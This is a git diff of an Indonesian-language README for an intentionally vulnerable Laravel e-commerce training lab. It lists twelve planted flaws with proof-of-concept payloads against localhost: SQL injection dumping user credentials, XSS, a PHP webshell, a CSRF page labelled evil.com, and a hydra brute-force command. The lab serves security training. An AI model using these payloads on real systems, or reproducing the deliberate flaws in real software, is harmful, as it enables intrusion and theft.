@@ -1,188 +1,265 @@
+# 🛍️ Warung Pak Budi — Vulnerable Web App Lab
+
 <div align="center">
 
-<!-- Laravel Logo -->
-<img src="https://raw.githubusercontent.com/laravel/art/master/logo-lockup/5%20SVG/2%20CMYK/1%20Full%20Color/laravel-logolockup-cmyk-red.svg" width="300" alt="Laravel Logo"/>
+![Laravel](https://img.shields.io/badge/Laravel-11.x-FF2D20?style=for-the-badge&logo=laravel&logoColor=white)
+![PHP](https://img.shields.io/badge/PHP-8.2+-777BB4?style=for-the-badge&logo=php&logoColor=white)
+![MySQL](https://img.shields.io/badge/MySQL-8.0-4479A1?style=for-the-badge&logo=mysql&logoColor=white)
+![Status](https://img.shields.io/badge/Status-Intentionally%20Vulnerable-red?style=for-the-badge)
+![Purpose](https://img.shields.io/badge/Purpose-Ethical%20Hacking%20Lab-orange?style=for-the-badge)
 
-<br/>
-<br/>
-
-<!-- Hacking-style title banner -->
-```
-╔══════════════════════════════════════════════════════════╗
-║   ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗      █████╗██████╗  ║
-║   ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║     ██╔══██╗██╔══██╗ ║
-║   ███████║███████║██║     █████╔╝ ██║     ███████║██████╔╝ ║
-║   ██╔══██║██╔══██║██║     ██╔═██╗ ██║     ██╔══██║██╔══██╗ ║
-║   ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║██████╔╝ ║
-║   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝  ║
-║              L A B  —  E T H I C A L  H A C K I N G         ║
-╚══════════════════════════════════════════════════════════╝
-```
-
-<br/>
-
-<!-- Badges -->
-![Laravel](https://img.shields.io/badge/Laravel-FF2D20?style=for-the-badge&logo=laravel&logoColor=white)
-![PHP](https://img.shields.io/badge/PHP-777BB4?style=for-the-badge&logo=php&logoColor=white)
-![MySQL](https://img.shields.io/badge/MySQL-4479A1?style=for-the-badge&logo=mysql&logoColor=white)
-![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)
-![Status](https://img.shields.io/badge/Status-Active-brightgreen?style=for-the-badge)
-![Purpose](https://img.shields.io/badge/Purpose-Educational%20Only-orange?style=for-the-badge)
-
-<br/>
-
-> *"The quieter you become, the more you are able to hear."* — Kali Linux
+> ⚠️ **PERINGATAN**: Aplikasi ini **SENGAJA DIBUAT RENTAN** untuk tujuan edukasi.
+> **JANGAN** deploy ke server publik atau production environment!
 
 </div>
 
 ---
 
-## 🔐 Tentang Project Ini
+## 📖 Tentang Lab Ini
 
-**HackLab** adalah sebuah **web application lab** yang dibangun dengan framework **Laravel**, dirancang khusus sebagai lingkungan latihan yang aman untuk belajar **Ethical Hacking** dan **Penetration Testing**.
+**Warung Pak Budi** adalah aplikasi web e-commerce yang sengaja dibangun dengan berbagai kerentanan keamanan (*intentionally vulnerable*) sebagai **media latihan bug hunting dan ethical hacking**.
 
-Lab ini menyediakan berbagai skenario kerentanan (*vulnerabilities*) yang sengaja dibuat untuk tujuan pembelajaran — membantu kamu memahami cara kerja serangan siber dari sudut pandang seorang attacker, sekaligus belajar cara mempertahankannya sebagai seorang defender.
+Lab ini terinspirasi dari project seperti:
+- [DVWA (Damn Vulnerable Web Application)](https://dvwa.co.uk/)
+- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
+- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)
 
-> ⚠️ **DISCLAIMER:** Lab ini **hanya untuk tujuan edukasi**. Jangan gunakan teknik yang dipelajari di sini pada sistem yang bukan milikmu atau tanpa izin tertulis. Segala penyalahgunaan adalah tanggung jawab pengguna sepenuhnya.
-
----
-
-## 🎯 Tujuan & Sasaran
-
-```
-[ TARGET ACQUIRED ]
-
-  ✅  Memahami konsep dasar kerentanan web (OWASP Top 10)
-  ✅  Latihan teknik penetration testing secara legal & aman
-  ✅  Mengembangkan kemampuan sebagai ethical hacker
-  ✅  Belajar dari perspektif attacker & defender
-  ✅  Persiapan sertifikasi (CEH, OSCP, eJPT, dsb.)
-```
+Namun berfokus pada konteks **web e-commerce berbasis Laravel** — salah satu framework PHP paling populer di Indonesia.
 
 ---
 
-## 🧰 Tech Stack
+## 🎯 Tujuan Lab
+
+- Memahami kerentanan web yang umum terjadi di aplikasi e-commerce nyata
+- Berlatih teknik **bug hunting** dan **penetration testing** secara legal & aman
+- Memahami cara kerja eksploitasi dan dampaknya terhadap sistem
+- Melatih kemampuan analisis kode sumber (*source code review*)
+- Persiapan untuk **Bug Bounty**, **CTF**, dan **Sertifikasi Keamanan** (CEH, OSCP, dll.)
+
+---
+
+## 🛠️ Tech Stack
 
 | Komponen | Teknologi |
-|----------|-----------|
-| **Framework** | Laravel (PHP) |
-| **Database** | MySQL / SQLite |
-| **Frontend** | Blade + Tailwind CSS |
+|---|---|
+| **Framework** | Laravel 11.x |
+| **Bahasa** | PHP 8.2+ |
+| **Database** | MySQL 8.0 |
+| **Frontend** | Blade Template + Tailwind CSS (CDN) |
 | **Auth** | Laravel Breeze |
-| **Server** | Apache / Nginx |
-| **Environment** | PHP 8.x |
+| **Storage** | Laravel Storage (local disk) |
 
 ---
 
-## 🗂️ Struktur Lab & Modul
-
-```
-hacklab/
-├── 🔴  SQLi Lab          — SQL Injection (Classic, Blind, Time-Based)
-├── 🟠  XSS Lab           — Cross-Site Scripting (Reflected, Stored, DOM)
-├── 🟡  IDOR Lab          — Insecure Direct Object Reference
-├── 🟢  Auth Lab          — Broken Authentication & Session Management
-├── 🔵  CSRF Lab          — Cross-Site Request Forgery
-├── 🟣  File Upload Lab   — Unrestricted File Upload
-├── ⚪  LFI/RFI Lab       — Local & Remote File Inclusion
-└── 🔒  Secure Coding     — Contoh kode yang aman sebagai perbandingan
-```
-
----
-
-## ⚡ Instalasi & Setup
+## 🚀 Cara Setup & Menjalankan
 
 ### Prasyarat
-
-Pastikan sistem kamu sudah terinstall:
-- PHP >= 8.1
+- PHP >= 8.2
 - Composer
-- MySQL / MariaDB
-- Node.js & NPM
+- MySQL
+- Git
 
 ### Langkah Instalasi
 
 ```bash
-# 1. Clone repository ini
-git clone https://github.com/username/hacklab.git
-cd hacklab
+# 1. Clone repository
+git clone https://github.com/harukato588/Warung_Pak-Budi-.git
+cd Warung_Pak-Budi-
 
-# 2. Install dependencies PHP
+# 2. Install dependencies
 composer install
 
-# 3. Install dependencies Node
-npm install && npm run build
-
-# 4. Salin file environment
+# 3. Salin file environment
 cp .env.example .env
 
-# 5. Generate application key
+# 4. Generate application key
 php artisan key:generate
 
-# 6. Setup database di file .env, lalu jalankan migrasi
+# 5. Konfigurasi database di .env
+# DB_DATABASE=toko_online
+# DB_USERNAME=root
+# DB_PASSWORD=
+
+# 6. Buat database & jalankan migrasi + seeder
 php artisan migrate --seed
 
-# 7. Jalankan server lokal
+# 7. Buat symbolic link storage
+php artisan storage:link
+
+# 8. Jalankan server
 php artisan serve
 ```
 
-> 🌐 Akses lab di: `http://localhost:8000`
+Buka browser: `http://127.0.0.1:8000`
 
 ---
 
-## 🛡️ Etika & Aturan Penggunaan
+## 🔴 Daftar Kerentanan
+
+Lab ini mengandung **12 kerentanan** yang dapat ditemukan dan dieksploitasi:
+
+---
+
+### 1. 💉 SQL Injection (SQLi)
+- **Lokasi**: `GET /products?search=`
+- **Tipe**: Error-based & UNION-based
+- **Deskripsi**: Input pencarian dimasukkan langsung ke raw SQL query tanpa prepared statement
+- **PoC**:
+  ```
+  /products?search=' OR '1'='1
+  /products?search=' UNION SELECT 1,email,password,4,5,6 FROM users-- -
+  ```
+- **Tools**: `sqlmap`, Burp Suite
+
+---
+
+### 2. 🖥️ Cross-Site Scripting / XSS (Reflected + Stored)
+- **Lokasi**:
+  - Reflected: `GET /products?search=`
+  - Stored: Nama & deskripsi produk di `/products`, `/products/{id}`, `/cart`
+- **Deskripsi**: Output tidak di-escape menggunakan `{!! !!}` alih-alih `{{ }}`
+- **PoC Reflected**: `/products?search=<script>alert(document.cookie)</script>`
+- **PoC Stored**: Buat produk dengan nama `<img src=x onerror=alert(1)>`
+
+---
+
+### 3. 🔓 IDOR — Insecure Direct Object Reference
+- **Lokasi**: `GET /order/{id}`, `POST /cart/remove/{id}`, `GET /orders`
+- **Deskripsi**: Tidak ada pengecekan kepemilikan resource — user bisa akses data milik user lain hanya dengan menebak ID
+- **PoC**: Login sebagai user biasa, lalu akses `/order/1` milik user lain
+- **PoC lain**: `GET /orders` — menampilkan **semua** order dari seluruh user
+
+---
+
+### 4. 🚪 Broken Access Control
+- **Lokasi**: `/admin/products/create`, `/admin/products/{id}/edit`, `/admin/products/{id}` (DELETE)
+- **Deskripsi**: Route admin hanya mengecek status login, tidak mengecek role/permission admin
+- **PoC**: Login sebagai user biasa → akses `/admin/products/create` → berhasil!
+
+---
+
+### 5. 📦 Mass Assignment
+- **Lokasi**: Semua model (`Product`, `Order`, `OrderItem`) — `$guarded = []`
+- **Deskripsi**: Semua field model bisa diisi dari HTTP request tanpa filter
+- **PoC**: Kirim field tambahan saat register: `is_admin=1&role=admin`
+
+---
+
+### 6. 📂 Insecure File Upload
+- **Lokasi**: `POST /admin/products` (field `image`)
+- **Deskripsi**: Tidak ada validasi tipe/ekstensi file — file `.php` bisa diupload sebagai webshell
+- **PoC**:
+  1. Upload file `shell.php` dengan isi: `<?php system($_GET['cmd']); ?>`
+  2. Akses: `http://127.0.0.1:8000/storage/products/shell.php?cmd=whoami`
+
+---
+
+### 7. 💰 Price Manipulation (Business Logic Flaw)
+- **Lokasi**: `POST /checkout`
+- **Deskripsi**: Total harga diterima dari client-side (hidden field & POST body) tanpa verifikasi server
+- **PoC**: Intercept request checkout dengan Burp Suite → ubah `total_price=1` → checkout seharga Rp 1!
+
+---
+
+### 8. 📉 Negative Quantity / Inventory Manipulation
+- **Lokasi**: `POST /cart/{product_id}`
+- **Deskripsi**: Field `quantity` tidak divalidasi — bisa bernilai negatif atau sangat besar
+- **PoC**: Kirim `quantity=-100` → stok produk naik secara ilegal setelah checkout
+
+---
+
+### 9. 🔄 CSRF — Cross-Site Request Forgery
+- **Lokasi**: `POST /cart/remove/{id}` (tidak ada `@csrf`)
+- **Deskripsi**: Beberapa route tidak memiliki perlindungan CSRF token
+- **PoC**: Buat halaman HTML di domain lain yang auto-submit form ke endpoint ini
+
+```html
+<!-- evil.com/attack.html -->
+<form method="POST" action="http://127.0.0.1:8000/cart/remove/1">
+  <input type="submit" value="Klaim Hadiah!">
+</form>
+<script>document.forms[0].submit();</script>
+```
+
+---
+
+### 10. 🔍 Sensitive Data Exposure
+- **Lokasi**: `GET /api/debug` *(tanpa autentikasi!)*
+- **Deskripsi**: Endpoint debug terbuka untuk publik, membocorkan data sensitif
+- **Data yang bocor**:
+  - Semua user beserta password hash
+  - `APP_KEY` aplikasi Laravel
+  - Username & password database
+  - Isi `$_SERVER` (environment server)
+- **PoC**: `curl http://127.0.0.1:8000/api/debug`
+
+---
+
+### 11. 🔑 Broken Authentication — No Rate Limiting
+- **Lokasi**: `POST /login`
+- **Deskripsi**: Tidak ada pembatasan percobaan login — rentan terhadap serangan brute force
+- **PoC**:
+  ```bash
+  hydra -l admin@test.com -P /usr/share/wordlists/rockyou.txt \
+    127.0.0.1 http-post-form \
+    "/login:email=^USER^&password=^PASS^:These credentials"
+  ```
+
+---
+
+### 12. 📢 Information Disclosure via Error Messages
+- **Lokasi**: Semua halaman (karena `APP_DEBUG=true`)
+- **Deskripsi**: Stack trace Laravel lengkap dengan path file dan versi framework tampil saat error
+- **PoC**: `GET /products/99999999` → muncul full stack trace + versi PHP & Laravel
+
+---
+
+## 🗂️ Urutan Latihan yang Disarankan
 
 ```
-╔─────────────────────────────────────────────────────╗
-│              ⚖️  KODE ETIK PENGGUNA                  │
-├─────────────────────────────────────────────────────┤
-│  [✓]  Gunakan HANYA di lingkungan lab ini            │
-│  [✓]  Jangan deploy lab ini ke server publik         │
-│  [✓]  Hormati privasi dan data orang lain            │
-│  [✓]  Gunakan ilmu ini untuk kebaikan (blue team)    │
-│  [✗]  JANGAN gunakan pada sistem tanpa izin          │
-│  [✗]  JANGAN gunakan untuk tujuan ilegal             │
-╚─────────────────────────────────────────────────────╝
+1. Recon          → /api/debug             (dapatkan semua kredensial)
+2. SQLi           → /products?search=      (dump seluruh database)
+3. IDOR           → /order/1,2,3...        (baca data order user lain)
+4. File Upload    → /admin/products        (upload webshell → RCE)
+5. Stored XSS     → Nama produk            (inject script berbahaya)
+6. Priv Escalation → Mass Assignment       (jadikan akun jadi admin)
+7. Logic Bug      → Price Manipulation     (beli produk seharga Rp 1)
 ```
 
 ---
 
-## 📚 Referensi & Sumber Belajar
+## 🛡️ Tools yang Disarankan
 
-- 🌐 [OWASP Top 10](https://owasp.org/www-project-top-ten/)
-- 📖 [HackTricks](https://book.hacktricks.xyz/)
-- 🖥️ [TryHackMe](https://tryhackme.com/)
-- 💻 [HackTheBox](https://www.hackthebox.com/)
-- 🎓 [PortSwigger Web Security Academy](https://portswigger.net/web-security)
-- 🇮🇩 [Hacktrace](https://hacktrace.id/) — Platform CTF Lokal Indonesia
-
----
-
-## 🤝 Kontribusi
-
-Kontribusi sangat terbuka! Jika kamu ingin menambahkan modul baru, memperbaiki bug, atau meningkatkan dokumentasi:
-
-1. Fork repository ini
-2. Buat branch baru: `git checkout -b fitur/nama-modul`
-3. Commit perubahan: `git commit -m 'feat: tambah modul XSS'`
-4. Push ke branch: `git push origin fitur/nama-modul`
-5. Buat Pull Request
+| Tool | Kegunaan |
+|---|---|
+| **Burp Suite** | Intercept & modifikasi HTTP request |
+| **sqlmap** | Otomasi SQL Injection |
+| **OWASP ZAP** | Scanner kerentanan web |
+| **Hydra** | Brute force login |
+| **Nikto** | Web server scanner |
+| **curl / Postman** | Manual HTTP request testing |
 
 ---
 
-## 📄 Lisensi
+## ⚠️ Disclaimer
 
-Project ini dilisensikan di bawah [MIT License](LICENSE) — bebas digunakan untuk keperluan edukasi.
+> Proyek ini dibuat **murni untuk tujuan edukasi** dalam bidang keamanan siber.
+> Semua kerentanan ditanamkan secara **sengaja** untuk keperluan latihan.
+>
+> **Dilarang keras** menggunakan teknik atau pengetahuan yang didapat dari lab ini
+> untuk menyerang sistem tanpa izin (unauthorized access).
+>
+> Gunakan hanya di **environment lokal / lab terisolasi**.
+> Pembuat tidak bertanggung jawab atas penyalahgunaan materi ini.
+
+---
+
+## 👤 Author
+
+**harukato588** — Proyek latihan ethical hacking & bug hunting
 
 ---
 
 <div align="center">
-
-**Dibuat dengan ❤️ untuk komunitas keamanan siber Indonesia**
-
-```
-[ STATUS: LEARNING IN PROGRESS... ]
-[ ACCESS GRANTED — HAPPY HACKING! ]
-```
-
+  <i>Happy Hacking! 🔐 — Gunakan ilmu untuk kebaikan.</i>
 </div>
